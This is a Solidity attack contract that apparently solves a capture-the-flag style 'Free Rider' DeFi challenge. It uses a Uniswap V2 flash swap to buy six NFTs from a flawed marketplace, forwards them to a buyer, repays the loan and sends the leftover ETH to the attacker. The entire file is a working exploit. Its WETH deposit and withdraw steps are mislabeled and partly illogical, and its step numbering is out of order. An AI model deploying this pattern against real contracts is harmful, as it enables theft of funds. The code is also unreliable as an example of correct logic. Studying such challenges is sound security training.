// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../free-rider/FreeRiderNFTMarketplace.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";

interface IWETH {
    function deposit() external payable;

    function transfer(address to, uint256 value) external returns (bool);

    function withdraw(uint256) external;
}

contract FreeRiderAttacker {
    FreeRiderNFTMarketplace private immutable marketplace;
    IUniswapV2Pair private immutable uniswapPair;
    IERC721 private immutable NFTs;
    IWETH private immutable WETH;

    address private immutable attacker;
    address private immutable buyer;
    uint256[] tokenIds = [0, 1, 2, 3, 4, 5];

    receive() external payable {}

    constructor(
        address payable _marketplace,
        address _uniswapPair,
        address payable _NFTs,
        address _WETH,
        address _buyer
    ) {
        marketplace = FreeRiderNFTMarketplace(_marketplace);
        uniswapPair = IUniswapV2Pair(_uniswapPair);
        NFTs = IERC721(_NFTs);
        WETH = IWETH(_WETH);
        buyer = _buyer;
        attacker = msg.sender;
    }

    function attack(uint256 _amount) external payable {
        require(msg.sender == attacker);
        bytes memory data = "1";

        // 1. Do the flash swap to get WETH
        uniswapPair.swap(
            _amount, // amount0 => WETH
            0, // amount1 => DVT
            address(this), // recipient of flash swap
            data // passed to uniswapV2Call function that uniswapPair triggers on the recipient (this)
        );
    }

    function uniswapV2Call(
        address,
        uint256 amount0,
        uint256,
        bytes calldata
    ) external {
        // 2. Deposit WETH to get ETH
        WETH.deposit{value: amount0}();

        // 3. Buy the NFTs
        marketplace.buyMany{value: amount0}(tokenIds);

        // 6. Send NFTs to buyer
        for (uint256 i = 0; i < 6; i++) {
            NFTs.safeTransferFrom(address(this), address(buyer), tokenIds[i]);
        }

        // 4. Deposit ETH to get WETH
        WETH.withdraw(amount0);

        // 5. Pay the WETH flash swap back
        uint256 _fee = ((amount0 * 3) / 997) + 1; // 1+ is there in case the integer division equals zero.
        uint256 _repayAmount = _fee + amount0;
        WETH.deposit{value: amount0}();
        WETH.transfer(address(uniswapPair), _repayAmount);

        // 7. Transfer ETH to attacker
        (bool success, ) = attacker.call{value: address(this).balance}("");
        require(success, "ETH transfer failed");
    }

    // Function that allows this contract to receive NFTs
    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external view returns (bytes4) {
        require(msg.sender == address(NFTs) && tx.origin == attacker);
        return 0x150b7a02; // ERC721Receiver.onERC721Received.selector
    }
}
